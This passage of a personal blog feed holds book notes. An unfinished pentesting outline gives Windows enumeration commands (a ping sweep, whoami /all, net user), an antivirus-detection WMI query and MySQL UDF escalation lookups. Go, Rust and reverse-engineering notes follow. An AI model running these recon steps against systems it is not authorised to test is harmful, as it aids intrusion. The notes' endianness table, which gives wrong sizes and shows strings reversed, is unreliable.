Authentication</h3><ol><li>Client demonstrates it has the correct password by encrypting timestamp with its NTLM hash. This process is also know as <strong>pre-authentication</strong>.</li><li>After successful pre-authentication, the client requests a TGT (Ticket Granting Ticket) from the Authentication Server (AS), which is typically a DC (Domain Controller).</li><li>The client presents its TGT to TGS (Ticket Granting Server) to request access to a specific service. If the TGT is valid, the client receives a ST (Service Ticket) from the KDC’s TGS.</li><li>Client is allowed to access the service on the target server if both the ST and the service authentication are valid</li></ol><h3 id="Details-of-Kerberos-Authentication"><a href="#Details-of-Kerberos-Authentication" class="headerlink" title="Details of Kerberos Authentication"></a>Details of Kerberos Authentication</h3><ol><li><strong>AS-REQ and AS-REP (Interaction between client and AS)</strong>:<ol><li><strong>AS-REQ</strong>:\<br>When a client wants to access resources within a domain, after the user enters a username and password, the client sends an AS-REQ message to the Authentication Server (AS).\<br>The request includes information such as the message type, protocol version, client principal name (username), and pre-authentication.\<br>To prove knowledge of the password, the client encrypts a timestamp using a key derived from the user’s NTLM hash. This encrypted timestamp is included as pre-authentication data.\<br>The AS decrypts the timestamp to verify the client’s credentials. If the verification succeeds, the AS responds with an AS-REP message containing a Ticket Granting Ticket (TGT).</li><li><strong>AS-REP</strong>:</li></ol></li><li><strong>TGS-REQ and TGS-REP (Interaction between client and TGS)</strong>:<ol><li><strong>TGS-REQ</strong>:</li><li><strong>TGS-REP</strong>:</li></ol></li><li><strong>AP-REQ and AP-REP (Interaction between client and server)</strong>:<ol><li><strong>AP-REQ</strong>:</li><li><strong>AP-REP</strong>:</li></ol></li></ol><h2 id="1-4-Windows-Protocols"><a href="#1-4-Windows-Protocols" class="headerlink" title="1.4 - Windows Protocols"></a>1.4 - Windows Protocols</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>LLMNR (Link-Local Multicast Name Resolution)</p><p>LLMNR Spoofing</p><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS (Network Basic Input/Output System)</p><h3 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h3><p>WPAD (Web Proxy Auto-Discovery) Protocol</p><h2 id="1-5-WMI"><a href="#1-5-WMI" class="headerlink" title="1.5 - WMI"></a>1.5 - WMI</h2><p>WMI (Windows Management Instructmentation) is the essential of Windows XP/2000 system management. User can perform local or remote resource management.</p><p>It supports DCOM (Distributed Component Object Model) and WinRM (Windows Remote Management). It is a useful tool for Win32 operating system. On the other hand, it is a useful tool for fileless attack.</p><h3 id="WQL"><a href="#WQL" class="headerlink" title="WQL"></a>WQL</h3><p>WQL (WMI Query Language) is a SQL of WMI, it has a similar syntaxs to SQL. However, WQL can only be used for data query, it is not allowed to do creation, delete or modification to the instance of a class.</p><h3 id="Example-of-Querying"><a href="#Example-of-Querying" class="headerlink" title="Example of Querying"></a>Example of Querying</h3><p>Basic usage:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT properties[, properties] FROM class [where clause]<br></code></pre></td></tr></table></figure></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wbemtest<br></code></pre></td></tr></table></figure><h3 id="WMI-Client"><a href="#WMI-Client" class="headerlink" title="WMI Client"></a>WMI Client</h3><ol><li>PowerShell<ul><li>Get-WmiObject</li><li>Get-CimAssociatedInstance</li><li>Get-CimClass</li><li>Get-CimInstance</li><li>Get-CimSession</li><li>Set-WmiInstance</li><li>Set-CimInstance</li><li>Invoke-WmiMethod</li><li>Invoke-CimMethod</li><li>New-CimInstance</li><li>New-CimSession</li><li>New-CimSessionOption</li><li>Register-CimIndicationEvent</li><li>Register-WmiEvent</li><li>Remove-CimInstance</li><li>Remove-WmiObject</li><li>Remove-CimSession</li></ul></li><li>WBEMTEST</li><li>WinRM</li><li>Win explorer</li><li>WSH</li></ol><h3 id="WMI-Remote-Interactive"><a href="#WMI-Remote-Interactive" class="headerlink" title="WMI Remote Interactive"></a>WMI Remote Interactive</h3><ol><li>DCOM:\<br>DCOM (Distributed Component Object Model) is a set of APIs based on COM, introduced by Microsoft. Before understanding DCOM, it is necessary to understand COM.\<br>COM (Component Object Model) is a standard defined by Microsoft that specifies how software components communicate with each other on the same machine. It allows a client to interact with a component directly, without the need for any intermediate component.\<br>DCOM is an extension of COM that enables clients to use COM objects not only locally but also remotely over a network. This functionality is implemented using RPC (Remote Procedure Call).\<br>DCOM enhances COM by providing support for distributed computing, multiple network protocols, and secure communication.</li><li>WinRM</li></ol><h3 id="WMI-Events"><a href="#WMI-Events" class="headerlink" title="WMI Events"></a>WMI Events</h3><h3 id="Attacking-WMI"><a href="#Attacking-WMI" class="headerlink" title="Attacking WMI"></a>Attacking WMI</h3><ol><li>Information Extraction<ul><li>Computer/System Information: Win32_OperatingSystem, Win32_ComputerSystem</li><li>File/Directory: CIM_DataFile</li><li>Desk: Win32_Volume</li><li>Registry: StdRegProv</li><li>Process: Win32_Process</li><li>Service: Win32_Service</li><li>Event: Win32_NtLogEvent</li><li>Logged Account: Win32_LoggedOnUser, Win32_LogonSession</li><li>Sharing: Win32_Share</li><li>Hotfix: Win32_QuickFixEngineering</li><li>Network: Win32_IP4RouteTable</li><li>User Account: Win32_UserAccount</li><li>User Group: Win32_Group</li></ul></li><li>Anti-Virus<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM AntiVirusProduct<br></code></pre></td></tr></table></figure></li><li>Lateral Movement</li></ol><h1 id="Chapter-2-Information-Extraction"><a href="#Chapter-2-Information-Extraction" class="headerlink" title="Chapter.2 - Information Extraction"></a>Chapter.2 - Information Extraction</h1><h2 id="2-1-Host-Enumeration"><a href="#2-1-Host-Enumeration" class="headerlink" title="2.1 - Host Enumeration"></a>2.1 - Host Enumeration</h2><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; for /l %i in (1,1,255) do @ping x.x.x.%i -w 1 -n 1 | find /i &quot;ttl&quot;<br></code></pre></td></tr></table></figure><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net use<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net session<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; ipconfig /displaydns<br></code></pre></td></tr></table></figure><h2 id="2-2-Information-Extraction-on-Windows"><a href="#2-2-Information-Extraction-on-Windows" class="headerlink" title="2.2 - Information Extraction on Windows"></a>2.2 - Information Extraction on Windows</h2><h3 id="User’s-Information-and-Privilege"><a href="#User’s-Information-and-Privilege" class="headerlink" title="User’s Information and Privilege"></a>User’s Information and Privilege</h3><div class="table-container"><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>net user</td></tr><tr><td>net localgroup administrators</td></tr><tr><td>query user</td></tr><tr><td>whoami /all</td></tr><tr><td>whoami &amp;&amp; whomai /priv</td></tr><tr><td>net localgroup</td></tr></tbody></table></div><h3 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h3><div class="table-container"><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>ipconfig /all</td></tr><tr><td>wmic service list brief</td></tr></tbody></table></div><h3 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h3><h2 id="2-2-Information-Extraction-on-Linux"><a href="#2-2-Information-Extraction-on-Linux" class="headerlink" title="2.2 - Information Extraction on Linux"></a>2.2 - Information Extraction on Linux</h2><h1 id="Chapter-3-Tunneling"><a href="#Chapter-3-Tunneling" class="headerlink" title="Chapter.3 - Tunneling"></a>Chapter.3 - Tunneling</h1><h1 id="Chapter-4-Privilege-Escalation"><a href="#Chapter-4-Privilege-Escalation" class="headerlink" title="Chapter.4 - Privilege Escalation"></a>Chapter.4 - Privilege Escalation</h1><h2 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h2><h3 id="Bad-Configuration"><a href="#Bad-Configuration" class="headerlink" title="Bad Configuration"></a>Bad Configuration</h3><h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><h3 id="Privilege-Escalation-with-3rd-Service"><a href="#Privilege-Escalation-with-3rd-Service" class="headerlink" title="Privilege Escalation with 3rd Service"></a>Privilege Escalation with 3rd Service</h3><ol><li>MySQL UDF<ol><li>What is UDF</li><li>How to do escalation  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select @@plugin_dir;<br>mysql&gt; show variables like, %plugin%;    <br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="Chapter-5-Credentials-Extraction"><a href="#Chapter-5-Credentials-Extraction" class="headerlink" title="Chapter.5 - Credentials Extraction"></a>Chapter.5 - Credentials Extraction</h1><h1 id="Chapter-6-Lateral-Movement"><a href="#Chapter-6-Lateral-Movement" class="headerlink" title="Chapter.6 - Lateral Movement"></a>Chapter.6 - Lateral Movement</h1><h1 id="Chapter-7-Persistence"><a href="#Chapter-7-Persistence" class="headerlink" title="Chapter.7 - Persistence"></a>Chapter.7 - Persistence</h1><h1 id="Thanks-for-reading"><a href="#Thanks-for-reading" class="headerlink" title="Thanks for reading!"></a>Thanks for reading!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.png'><img src="/images/meme/mika_nagisa_rollcake.png" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Hacking" scheme="http://example.com/tags/Hacking/"/>
    
    <category term="Hack" scheme="http://example.com/tags/Hack/"/>
    
    <category term="Penetration" scheme="http://example.com/tags/Penetration/"/>
    
    <category term="PrivilegeEscalation" scheme="http://example.com/tags/PrivilegeEscalation/"/>
    
    <category term="Security" scheme="http://example.com/tags/Security/"/>
    
    <category term="CyberSecurity" scheme="http://example.com/tags/CyberSecurity/"/>
    
    <category term="ATT&amp;CK" scheme="http://example.com/tags/ATT-CK/"/>
    
    <category term="Pentesting" scheme="http://example.com/tags/Pentesting/"/>
    
    <category term="ActiveDirectory" scheme="http://example.com/tags/ActiveDirectory/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Learning Go</title>
    <link href="http://example.com/2026/01/05/2026-1-5-LearningGo/"/>
    <id>http://example.com/2026/01/05/2026-1-5-LearningGo/</id>
    <published>2026-01-04T16:10:20.000Z</published>
    <updated>2026-01-22T17:10:31.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/LearningGo/libro.jpg'><img src="/images/books/LearningGo/libro.jpg"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Learning Go”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Chapter-1-Setting-Up-Your-Go-Environment"><a href="#Chapter-1-Setting-Up-Your-Go-Environment" class="headerlink" title="Chapter.1 - Setting Up Your Go Environment"></a>Chapter.1 - Setting Up Your Go Environment</h1><h2 id="The-go-command"><a href="#The-go-command" class="headerlink" title="The go command"></a>The <code>go</code> command</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import &quot;fmt&quot;<br><br>func main() &#123;<br>    fmt.Println(&quot;Hello, world!&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; go run hello.go<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; go build hello.go<br></code></pre></td></tr></table></figure><p>This creates an executable called <strong>hello</strong> (or <strong>hello.exe</strong> on Windows) in the current directory.</p><h2 id="Makefiles"><a href="#Makefiles" class="headerlink" title="Makefiles"></a>Makefiles</h2><p>Here’s a sample Makefile to add to our very simple project:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.DEFAULT_GOAL := build<br><br>fmt:<br>    go fmt ./...<br>.PHONY:fmt<br><br>lint: fmt<br>    golint ./...<br>.PHONY: lint<br><br>vet: fmt<br>    go vet ./...<br>.PHONY:vet<br><br>build: vet<br>go build hello.go<br>.PHONY:build<br></code></pre></td></tr></table></figure><br>Each possible operation is called a <strong>target</strong>. The <code>.DEFAULT_GOAL</code> defines which target is run when no target is specified. In our case, we are going to run the build target.</p><p>The world before the colon (:) is the name of the target. Any words after the target (like <code>vet</code> in the line <code>build: vet</code>) are the other targets that must be run before the specified target runs. The taks that are performed by the target are on the indented lines after the target (The)</p><p>Once theMakefile is in your directory, type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; make<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-2-Primative-Types-and-Declarations"><a href="#Chapter-2-Primative-Types-and-Declarations" class="headerlink" title="Chapter.2 - Primative Types and Declarations"></a>Chapter.2 - Primative Types and Declarations</h1><h1 id="Chapter-3-Composite-Types"><a href="#Chapter-3-Composite-Types" class="headerlink" title="Chapter.3 - Composite Types"></a>Chapter.3 - Composite Types</h1><h1 id="Chapter-4-Blocks-Shadows-and-Control-Structures"><a href="#Chapter-4-Blocks-Shadows-and-Control-Structures" class="headerlink" title="Chapter.4 - Blocks, Shadows, and Control Structures"></a>Chapter.4 - Blocks, Shadows, and Control Structures</h1><h1 id="Chapter-5-Functions"><a href="#Chapter-5-Functions" class="headerlink" title="Chapter.5 - Functions"></a>Chapter.5 - Functions</h1><h1 id="Chapter-6-Pointers"><a href="#Chapter-6-Pointers" class="headerlink" title="Chapter.6 - Pointers"></a>Chapter.6 - Pointers</h1><h1 id="Chapter-7-Types-Methods-and-Interfaces"><a href="#Chapter-7-Types-Methods-and-Interfaces" class="headerlink" title="Chapter.7 - Types, Methods, and Interfaces"></a>Chapter.7 - Types, Methods, and Interfaces</h1><h1 id="Chapter-8-Errors"><a href="#Chapter-8-Errors" class="headerlink" title="Chapter.8 - Errors"></a>Chapter.8 - Errors</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="Go-Lang" scheme="http://example.com/tags/Go-Lang/"/>
    
    <category term="Go" scheme="http://example.com/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Programming Rust</title>
    <link href="http://example.com/2026/01/05/2026-1-5-ProgrammingRust/"/>
    <id>http://example.com/2026/01/05/2026-1-5-ProgrammingRust/</id>
    <published>2026-01-04T16:09:54.000Z</published>
    <updated>2026-01-15T10:33:11.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/ProgrammingRust/libro.jpg'><img src="/images/books/ProgrammingRust/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="Rust" scheme="http://example.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Reverse Engineering Core (리버스 엔지니어링 핵심 원리)</title>
    <link href="http://example.com/2026/01/04/2026-1-4-BookReverseEngineeringCore/"/>
    <id>http://example.com/2026/01/04/2026-1-4-BookReverseEngineeringCore/</id>
    <published>2026-01-04T13:41:45.000Z</published>
    <updated>2026-01-21T15:42:09.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/libro.jpg'><img src="/images/books/ReverseEngineeringCore/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Reverse Engineering Core”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>Finally, I have completed this book.</p><p align="center" class='item-img' data-src='/images/meme/terrible_cake.png'><img src="/images/meme/terrible_cake.png" width="500"></p><p>I had always wanted to read this book. Unfortunately, due to personal issues, I was unable to do so for a long time. Therefore, I am glad that I finally finished it.</p><p>This book was originally written in Korean. It also has a Simplified Chinese translation. Unfortunately, I have not found an English version. Perhaps this is because there are already many books on reverse engineering written in English.</p><p>This book describes the underlying principles of reverse engineering in both theoretical and practical ways.</p><p>It introduces how to perform software reverse engineering on the Windows platform using tools such as OllyDbg, WinDbg, and PEView. IDA is rarely discussed. Therefore, this book is especially suitable for readers who want to master OllyDbg.</p><p>This book <strong>DOES NOT</strong> cover <strong>kernel debugging</strong>.</p><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_redtea.jpg'><img src="/images/meme/mika_nagisa_redtea.jpg" width="600"></p><p>The book also provides both source code and compiled PE files for all chapters. This is a significant advantage for hands-on practice, because compiling the code yourself may produce different results depending on the environment. In addition, some of the provided code examples are difficult to find on the internet.</p><p>This book includes:</p><ul><li>Reverse engineering on Windows</li><li>OllyDbg</li><li>WinDbg</li><li>PE file format</li><li>Windows API</li><li>Techniques for improving reverse engineering skills</li><li>The author’s experience (the author previously worked for an enterprise developing anti-virus software)</li><li>Advanced debugging</li><li>Anti-debugging</li><li>Advanced anti-debugging</li><li>Anti-anti-debugging</li><li>Code injection</li><li>DLL injection</li><li>Application patching</li><li>etc.</li></ul><p>This book does not include:</p><ul><li>Kernel debugging</li><li>IDA Pro</li><li>Ghidra</li><li>Reverse engineering on Linux</li><li>Reverse engineering of Android APKs</li><li>Reverse engineering of iOS applications</li></ul><p>Prerequisites (Recommended):</p><ul><li>Basic knowledge of C/C++</li><li>Basic knowledge of the Win32 API</li><li>Basic understanding of Windows</li><li>Passion, patience, and the ability to use Google</li></ul><p>You may feel frustrated during the process of reverse engineering. However, the author also mentioned that he experienced similar frustration.</p><p align="center" class='item-img' data-src='/images/meme/hakari_crying.jpeg'><img src="/images/meme/hakari_crying.jpeg" width="700"></p><h1 id="Chapter-1-Reverse-Engineering"><a href="#Chapter-1-Reverse-Engineering" class="headerlink" title="Chapter 1 - Reverse Engineering"></a>Chapter 1 - Reverse Engineering</h1><p>Murmur….</p><p>Blahblahblah….</p><p>This chapter introduces the background and basic knowledge of reverse engineering.</p><h1 id="Chapter-2-Hello-World"><a href="#Chapter-2-Hello-World" class="headerlink" title="Chapter 2 - Hello World!"></a>Chapter 2 - Hello World!</h1><h2 id="2-2-Debugging"><a href="#2-2-Debugging" class="headerlink" title="2.2 - Debugging"></a>2.2 - Debugging</h2><p><strong>Basic commands of OllyDbg</strong>:</p><div class="table-container"><table><thead><tr><th>Command</th><th>Hotkey</th><th>Description</th></tr></thead><tbody><tr><td>Restart</td><td>Ctrl+F2</td><td>Restart debugging.</td></tr><tr><td>Step Into</td><td>F7</td><td>Execute an OP code. If the OP code is <code>CALL</code>, then go into the called code.</td></tr><tr><td>Step Over</td><td>F8</td><td>Execute an OP code. If the OP code is <code>CALL</code>, then just execute the code rather then go into the called code.</td></tr><tr><td>Execute till Return</td><td>Ctrl+F9</td><td>Keep executing code until it reached <code>RETN</code></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;windows.h&quot;<br>#include &quot;tchar.h&quot;<br><br>int _tmain(int argc, TCHAR *argv[])<br>&#123;<br>    MessageBox(<br>        NULL, <br>        L&quot;Hello World!&quot;, <br>        L&quot;www.reversecre.com&quot;, <br>        MB_OK<br>    );<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.1.png'><img src="/images/books/ReverseEngineeringCore/2.1.png" width="800"></p><p>This is the <code>main()</code> function of <strong>HelloWorld.exe</strong></p><h2 id="2-3-Getting-Familar-with-Debugger"><a href="#2-3-Getting-Familar-with-Debugger" class="headerlink" title="2.3 - Getting Familar with Debugger"></a>2.3 - Getting Familar with Debugger</h2><div class="table-container"><table><thead><tr><th>Command</th><th>Hotkey</th><th>Description</th></tr></thead><tbody><tr><td>Go to</td><td>Ctrl+G</td></tr><tr><td>Execute till Cursor</td><td>F4</td></tr><tr><td>Comment</td><td>;</td></tr><tr><td>User-defined comment</td><td></td></tr><tr><td>Label</td><td>:</td></tr><tr><td>User-defined label</td><td></td></tr><tr><td>Set/Reset breakpoint</td><td>F2</td></tr><tr><td>Run</td><td>F9</td></tr><tr><td>Show the current EPI</td><td>*</td></tr><tr><td>Show the previous Cursor</td><td>-</td></tr><tr><td>Preview CALL/JMP address</td><td>Enter</td></tr></tbody></table></div><h2 id="2-4-Find-a-Specific-Code"><a href="#2-4-Find-a-Specific-Code" class="headerlink" title="2.4 - Find a Specific Code"></a>2.4 - Find a Specific Code</h2><ol><li>Executing Code</li><li>Searching with Text: Right click -&gt; Search for -&gt; All referenced text strings</li><li>Searching with used APIs: Right click -&gt; Search for -&gt; All intermodular calls</li></ol><h2 id="2-5-Patching-the-Code"><a href="#2-5-Patching-the-Code" class="headerlink" title="2.5 - Patching the Code"></a>2.5 - Patching the Code</h2><ol><li><p>Modifying the Buffer<br>Hexdump:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.2.png'><img src="/images/books/ReverseEngineeringCore/2.2.png" width="800"></p><p> Modifying, notice that we have to append a null char(<code>00 00</code>) at the end of a string.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.3.png'><img src="/images/books/ReverseEngineeringCore/2.3.png" width="500"></p><p> Patched code:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.4.png'><img src="/images/books/ReverseEngineeringCore/2.4.png" width="500"></p><p>Save code:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.5.png'><img src="/images/books/ReverseEngineeringCore/2.5.png" width="400"></p></li><li><p>Adding a new string in memory<br>Insert a string int memory</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.5.png'><img src="/images/books/ReverseEngineeringCore/2.5.png" width="400"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.7.png'><img src="/images/books/ReverseEngineeringCore/2.7.png" width="400"></p><p>Modify the assembly code</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.8.png'><img src="/images/books/ReverseEngineeringCore/2.8.png" width="400"></p><p>Patched code:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/2.9.png'><img src="/images/books/ReverseEngineeringCore/2.9.png" width="400"></p></li></ol><h1 id="Chapter-3-Little-Endian"><a href="#Chapter-3-Little-Endian" class="headerlink" title="Chapter 3 - Little Endian"></a>Chapter 3 - Little Endian</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BYTE b = 0x12;<br>WORD w = 0x1234;<br>DWORD dw = 0x12345678;<br>char str[] = &quot;abcde&quot;;<br></code></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>TYPE</th><th>Name</th><th>SIZE</th><th>Big-Endian</th><th>Little-Endian</th></tr></thead><tbody><tr><td>BYTE</td><td>b</td><td>1</td><td>[12]</td><td>[12]</td></tr><tr><td>WORD</td><td>w</td><td>2</td><td>[12][34]</td><td>[34][12]</td></tr><tr><td>DWORD</td><td>dw</td><td>3</td><td>[12][34][56][78]</td><td>[78][56][34][12]</td></tr><tr><td>char[]</td><td>str</td><td>4</td><td>[61][62][63][64][65][00]</td><td>[65][64][63][62][61][00]</td></tr></tbody></table></div><p><strong><code>main()</code> function</strong>:<br> <p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/3.1.png'><img src="/images/books/ReverseEngineeringCore/3.1.png" width="500"></p></p><p><strong>Hexdump</strong>:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/3.2.png'><img src="/images/books/ReverseEngineeringCore/3.2.png" width="500"></p><h1 id="Chapter-4-IA-32-Registers"><a href="#Chapter-4-IA-32-Registers" class="headerlink" title="Chapter 4 - IA-32 Registers"></a>Chapter 4 - IA-32 Registers</h1><h2 id="4-2-IA-32-Registers"><a href="#4-2-IA-32-Registers" class="headerlink" title="4.2 - IA-32 Registers"></a>4.2 - IA-32 Registers</h2><ul><li>General Purpose Registers(32-bit), x8</li><li>Segment Registers(16-bit), x6</li><li>Program Status and Control Register(32-bit), x1</li><li>Instruction Pointer(32-bit), x1</li></ul><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/4.reg.1.png'><img src="/images/books/ReverseEngineeringCore/4.reg.1.png" width="400"></p><ol><li><p>General Purpose Registers<br>These type of registers are used for temporary storage, also can be used for arthimetic calculation. Usually, they are used for storing addresses and constants.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/4.reg.2.png'><img src="/images/books/ReverseEngineeringCore/4.reg.2.png" width="400"></p><ul><li>EAX:</li><li>EBX:</li><li>ECX:</li><li>EDX:</li></ul></li><li><p>Segment Registers<br><strong>Segment</strong> is a protection technique in IA-32. The IA-32 architecture divides memory into multiple segments, and allocates start address, range, accessing privilege, etc to them. It also provides paging technique.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/4.segmentation.png'><img src="/images/books/ReverseEngineeringCore/4.segmentation.png" width="400"></p><ul><li>CS: Code Segment</li><li>SS: Stack Segment</li><li>DS: Data Segment</li><li>ES: Extra (Data) 